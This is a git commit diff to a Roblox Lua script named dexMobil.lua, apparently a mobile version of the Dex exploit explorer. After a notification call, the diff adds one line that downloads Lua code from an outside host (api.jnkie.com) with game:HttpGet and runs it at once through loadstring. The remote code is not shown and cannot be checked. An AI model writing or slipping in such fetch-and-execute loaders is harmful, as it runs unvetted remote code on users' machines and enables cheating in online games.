c0c924cc722d9e436c1c8e729f4bf3c59eb6d789
hjjjjjjjiiugghhhhhhggyi <133881734+hjjjjjjjiiugghhhhhhggyi@users.noreply.github.com>
2026-05-30 23:33:56 +0800

    Update dexMobil.lua

--- Tool/dexMobil.lua
+++ Tool/dexMobil.lua
@@ -16,3 +16,4 @@ StarterGui:SetCore("SendNotification", {
     Duration = 5,
     Icon = ""
 })
+SCRIPT_KEY = "78"loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/9494682362624cdee500a4811b23d431ad1e7568b48dc40c18dae221755ad1c7/download"))()
